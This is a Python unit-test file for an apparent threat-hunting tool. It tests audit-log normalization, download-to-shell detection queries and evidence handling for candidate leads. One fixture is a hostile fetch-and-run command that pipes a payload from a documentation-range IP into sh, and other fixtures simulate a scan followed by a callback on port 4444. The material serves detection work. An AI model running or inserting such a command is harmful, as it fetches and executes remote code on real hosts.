import json
import tempfile
import unittest
from dataclasses import replace
from pathlib import Path


class AuditNormalizationTests(unittest.TestCase):
    def test_hex_encoded_execve_arguments_become_structured_command_fields(self):
        from romulus.intelligence.normalization import normalize_elasticsearch_event

        command = "curl http://203.0.113.9/payload | sh"
        hit = {
            "message": (
                'type=EXECVE msg=audit(1731942292.100:42): argc=3 '
                'a0="/bin/sh" a1="-c" a2=' + command.encode().hex()
            )
        }

        normalized = normalize_elasticsearch_event(hit)

        self.assertEqual(normalized["process.args"], ["/bin/sh", "-c", command])
        self.assertEqual(normalized["process.command_line"], f"/bin/sh -c {command}")
        self.assertEqual(normalized["process.name"], "sh")
        self.assertEqual(normalized["process.executable"], "/bin/sh")
        self.assertEqual(normalized["message"], hit["message"])

    def test_invalid_hex_and_non_execve_messages_are_not_misdecoded(self):
        from romulus.intelligence.normalization import normalize_elasticsearch_event

        invalid = normalize_elasticsearch_event({
            "message": 'type=EXECVE msg=audit(1.0:2): argc=2 a0="tool" a1=zz11'
        })
        ordinary = normalize_elasticsearch_event({"message": "health check a0=6375726c"})

        self.assertEqual(invalid["process.args"], ["tool", "zz11"])
        self.assertEqual(invalid["process.command_line"], "tool zz11")
        self.assertNotIn("process.command_line", ordinary)

    def test_quoted_hex_looking_execve_argument_remains_literal(self):
        from romulus.intelligence.normalization import normalize_elasticsearch_event

        normalized = normalize_elasticsearch_event({
            "message": 'type=EXECVE msg=audit(1.0:2): argc=2 a0="6375726c" a1=6375726c'
        })

        self.assertEqual(normalized["process.args"], ["6375726c", "curl"])
        self.assertEqual(normalized["process.command_line"], "6375726c curl")


class BehaviorSeedPrecisionTests(unittest.TestCase):
    def test_download_to_shell_seed_requires_both_behaviors_and_queries_audit_hex(self):
        from romulus.intelligence.behavior_catalog import (
            compile_elasticsearch_seed,
            load_behavior_catalog,
        )

        analytic = next(
            item for item in load_behavior_catalog()["analytics"]
            if item["id"] == "BH-LNX-003"
        )
        query = compile_elasticsearch_seed(
            analytic,
            {"process.command_line": ["message", "event.original", "process.command_line"]},
            "@timestamp",
            {"gte": "2024-11-18T10:00:00Z", "lte": "2024-11-18T17:00:00Z"},
        )

        self.assertEqual(len(analytic["match"]["all"]), 2)
        self.assertEqual(len(query["bool"]["must"]), 2)
        encoded = json.dumps(query, sort_keys=True).lower()
        self.assertIn("curl", encoded)
        self.assertIn("| sh", encoded)
        self.assertIn("6375726c", encoded)


class CompleteEvidenceAnalysisTests(unittest.TestCase):
    def test_full_candidate_catalog_is_persisted_while_checkpoint_queue_is_bounded(self):
        from romulus.config import Settings
        from romulus.investigation.workflow import HuntEngine
        from romulus.models import Evidence, encode
        from romulus.store import Store

        with tempfile.TemporaryDirectory(dir=Path(__file__).resolve().parent) as directory:
            root = Path(directory)
            settings = replace(
                Settings.from_env(),
                home=root,
                data_dir=root / "data",
                logs_dir=root / "logs",
                reports_dir=root / "reports",
                context_evidence_per_source=2,
            )
            store = Store(settings.data_dir, settings.logs_dir)
            engine = HuntEngine(settings, store, offline=True, use_ollama=False)
            engine.behavior_catalog = {"catalog_version": "test", "analytics": [{
                "id": "BH-TEST-TEMP", "title": "Temporary executable",
                "description": "Executable observed below /tmp.", "enabled": True,
                "source": "elasticsearch", "match": {"all": [], "any": [{
                    "role": "process.executable", "operator": "path_prefix_any",
                    "values": ["/tmp/"],
                }], "none": []},
                "base_priority": 80, "specificity": 50, "expected_noise": "low",
                "attack_techniques": ["T1204.002"], "benign_explanations": [],
                "follow_up": ["Review the process context."],
                "corroboration_group": "test-temp",
            }]}
            engine.local_indicators = {"indicators": []}
            state = {
                "hunt_id": "HUNT-BOUNDED-CANDIDATES",
                "objective": "general hunt",
                "host": [], "network": [], "evidence": [],
                "hypotheses": [], "findings": [], "correlations": [],
                "coverage": {}, "candidate_leads": [], "lead_catalog": [],
                "completed_leads": [], "pivot_results": [], "queries": [],
                "tool_runs": [], "stage_history": [], "source_errors": [],
                "search_tasks": {}, "search_outcomes": [], "evidence_keys": [],
                "source_health": {"host": True, "network": True},
            }
            for index in range(130):
                engine._record_evidence(state, encode(Evidence.create(
                    "elasticsearch",
                    f"temporary executable on host-{index:03d}",
                    observed_at=f"2026-10-14T14:{index // 60:02d}:{index % 60:02d}Z",
                    asset=f"host-{index:03d}",
                    provenance={"index": "host-events", "document_id": str(index), "domain": "host"},
                    raw={"host": {"name": f"host-{index:03d}"},
                         "process": {"executable": "/tmp/tool"}},
                )))

            result = engine._analyze(state)

            self.assertEqual(store.candidate_count(state["hunt_id"]), 130)
            self.assertEqual(len(store.list_candidates(state["hunt_id"])), 130)
            self.assertEqual(len(result["candidate_leads"]), 100)
            self.assertEqual(result["coverage"]["behavior_candidates"]["total"], 130)
            self.assertEqual(result["coverage"]["behavior_candidates"]["retained_in_state"], 100)
            self.assertEqual(result["coverage"]["behavior_candidates"]["state_limit"], 100)
            ledger = result["coverage"]["hypothesis_coverage"]
            self.assertEqual(ledger["actionable_candidates"], 130)
            self.assertEqual(ledger["open_candidate_count"], 130)
            self.assertEqual(len(ledger["open_candidate_ids"]), 100)
            self.assertEqual(len(ledger["candidate_rows"]), 100)
            self.assertTrue(ledger["candidate_details_truncated"])

    def test_save_bounds_legacy_state_and_rotates_exhausted_candidates(self):
        from romulus.config import Settings
        from romulus.investigation.workflow import HuntEngine
        from romulus.store import Store

        with tempfile.TemporaryDirectory(dir=Path(__file__).resolve().parent) as directory:
            root = Path(directory)
            settings = replace(Settings.from_env(), home=root, data_dir=root / "data",
                logs_dir=root / "logs", reports_dir=root / "reports")
            store = Store(settings.data_dir, settings.logs_dir)
            engine = HuntEngine(settings, store, offline=True, use_ollama=False)
            candidates = []
            for index in range(101):
                status = "completed" if index == 0 else "pending"
                candidates.append({
                    "candidate_id": f"CL-{index:03d}", "kind": "behavior",
                    "priority_score": 90, "priority_tier": "critical",
                    "disposition": "investigating", "evidence_ids": [],
                    "follow_ups": [{"follow_up_id": f"FU-{index:03d}",
                        "status": status, "history": []}],
                })
            state = {"hunt_id": "HUNT-LEGACY-CANDIDATES", "candidate_leads": candidates}

            result = engine._save(state)

            retained = {item["candidate_id"] for item in result["candidate_leads"]}
            self.assertEqual(store.candidate_count(state["hunt_id"]), 101)
            self.assertEqual(len(result["candidate_leads"]), 100)
            self.assertNotIn("CL-000", retained)
            self.assertIn("CL-100", retained)

    def test_working_set_retains_completed_reportable_candidate_while_rotating_work(self):
        from romulus.config import Settings
        from romulus.investigation.workflow import HuntEngine
        from romulus.store import Store

        with tempfile.TemporaryDirectory(dir=Path(__file__).resolve().parent) as directory:
            root = Path(directory)
            settings = replace(Settings.from_env(), home=root, data_dir=root / "data",
                logs_dir=root / "logs", reports_dir=root / "reports")
            store = Store(settings.data_dir, settings.logs_dir)
            engine = HuntEngine(settings, store, offline=True, use_ollama=False)
            candidates = []
            for index in range(102):
                completed = index in {0, 1}
                candidates.append({
                    "candidate_id": f"CL-{index:03d}",
                    "kind": "trusted_indicator" if index == 0 else "behavior",
                    "customer_visible": index == 0,
                    "priority_score": 95 if index == 0 else 90,
                    "priority_tier": "critical", "disposition": "corroborated",
                    "finding_ids": ["F-REPORTABLE"] if index == 0 else [],
                    "evidence_ids": [],
                    "follow_ups": [{"follow_up_id": f"FU-{index:03d}",
                        "status": "completed" if completed else "pending", "history": []}],
                })
            state = {"hunt_id": "HUNT-REPORTABLE-CANDIDATE", "candidate_leads": candidates}

            result = engine._save(state)

            retained = {item["candidate_id"] for item in result["candidate_leads"]}
            self.assertEqual(len(retained), 100)
            self.assertIn("CL-000", retained)
            self.assertNotIn("CL-001", retained)

    def test_analysis_uses_persisted_evidence_and_promotes_candidate_context(self):
        from romulus.config import Settings
        from romulus.investigation.workflow import HuntEngine
        from romulus.models import Evidence, encode
        from romulus.store import Store

        with tempfile.TemporaryDirectory(dir=Path(__file__).resolve().parent) as directory:
            root = Path(directory)
            settings = replace(
                Settings.from_env(),
                home=root,
                data_dir=root / "data",
                logs_dir=root / "logs",
                reports_dir=root / "reports",
                context_evidence_per_source=2,
            )
            store = Store(settings.data_dir, settings.logs_dir)
            engine = HuntEngine(settings, store, offline=True, use_ollama=False)
            state = {
                "hunt_id": "HUNT-COMPLETE-EVIDENCE",
                "objective": "general hunt",
                "host": [],
                "network": [],
                "evidence": [],
                "hypotheses": [],
                "findings": [],
                "correlations": [],
                "coverage": {},
                "candidate_leads": [],
                "lead_catalog": [],
                "completed_leads": [],
                "pivot_results": [],
                "queries": [],
                "tool_runs": [],
                "stage_history": [],
                "source_errors": [],
                "search_tasks": {},
                "search_outcomes": [],
                "evidence_keys": [],
                "source_health": {"host": True, "network": True},
            }

            def add_network(number, source, destination, port, when):
                item = encode(Evidence.create(
                    "arkime",
                    f"{source} connected to {destination}:{port}",
                    observed_at=when,
                    asset=destination,
                    provenance={"session_id": f"session-{number}", "domain": "network"},
                    raw={"source.ip": source, "destination.ip": destination,
                         "destination.port": port, "network.protocol": "tcp"},
                ))
                compact = engine._record_evidence(state, item)
                if compact:
                    state["network"].append(compact)
                return item["evidence_id"]

            add_network(1, "10.0.0.1", "10.0.0.2", 443, "2026-10-14T14:00:00Z")
            add_network(2, "10.0.0.2", "10.0.0.3", 443, "2026-10-14T14:00:01Z")
            for offset, port in enumerate(range(20, 28), start=3):
                add_network(offset, "203.0.113.9", "10.0.0.5", port,
                            f"2026-10-14T14:10:{offset:02d}Z")
            callback_id = add_network(
                11, "10.0.0.5", "203.0.113.9", 4444, "2026-10-14T14:11:00Z"
            )

            self.assertEqual(len(state["network"]), 2)
            result = engine._analyze(state)

            lead = next(item for item in result["candidate_leads"]
                        if item["analytic_id"] == "BH-NET-001")
            self.assertGreaterEqual(lead["priority_score"], 40)
            self.assertEqual(result["coverage"]["analysis_evidence"]["persisted"], 11)
            self.assertEqual(result["coverage"]["analysis_evidence"]["network"], 11)
            promoted_ids = {item["evidence_id"] for item in result["network"]}
            self.assertTrue(set(lead["evidence_ids"]) <= promoted_ids)
            self.assertIn(callback_id, promoted_ids)
            self.assertLessEqual(result["coverage"]["analysis_evidence"]["promoted"], 200)

    def test_candidate_promotion_prefers_nearby_same_host_and_ignores_process_only_matches(self):
        from romulus.config import Settings
        from romulus.investigation.workflow import HuntEngine
        from romulus.store import Store

        with tempfile.TemporaryDirectory(dir=Path(__file__).resolve().parent) as directory:
            root = Path(directory)
            settings = replace(Settings.from_env(), home=root, data_dir=root / "data",
                logs_dir=root / "logs", reports_dir=root / "reports")
            engine = HuntEngine(settings, Store(settings.data_dir, settings.logs_dir), offline=True)
            direct = {
                "evidence_id": "EV-DIRECT", "source": "elasticsearch",
                "observed_at": "2026-10-14T14:00:00Z", "asset": "host-a",
                "provenance": {"domain": "host"},
                "raw": {"host": {"name": "host-a"}, "process": {"name": "common-agent"}},
            }
            same_host_old = [{
                "evidence_id": f"EV-OLD-{index}", "source": "elasticsearch",
                "observed_at": f"2026-10-13T{index % 24:02d}:00:00Z", "asset": "host-a",
                "provenance": {"domain": "host"},
                "raw": {"host": {"name": "host-a"}, "process": {"name": "common-agent"}},
            } for index in range(205)]
            process_only = [{
                "evidence_id": f"EV-PROCESS-{index}", "source": "elasticsearch",
                "observed_at": "2026-10-12T13:59:00Z", "asset": f"host-{index + 100}",
                "provenance": {"domain": "host"},
                "raw": {"host": {"name": f"host-{index + 100}"}, "process": {"name": "common-agent"}},
            } for index in range(205)]
            adjacent = {
                "evidence_id": "EV-ADJACENT", "source": "elasticsearch",
                "observed_at": "2026-10-14T14:00:01Z", "asset": "host-a",
                "provenance": {"domain": "host"}, "raw": {"host": {"name": "host-a"}},
            }
            state = {"host": [], "network": []}
            promoted = engine._promote_candidate_context(state,
                [direct] + same_host_old + process_only + [adjacent], [{
                    "candidate_id": "CL-1", "kind": "behavior", "priority_score": 80,
                    "evidence_ids": ["EV-DIRECT"], "assets": ["host-a"],
                }])

            promoted_ids = {event["evidence_id"] for event in state["host"]}
            self.assertEqual(promoted, 200)
            self.assertIn("EV-ADJACENT", promoted_ids)
            self.assertFalse(any(value.startswith("EV-PROCESS-") for value in promoted_ids))


if __name__ == "__main__":
    unittest.main()
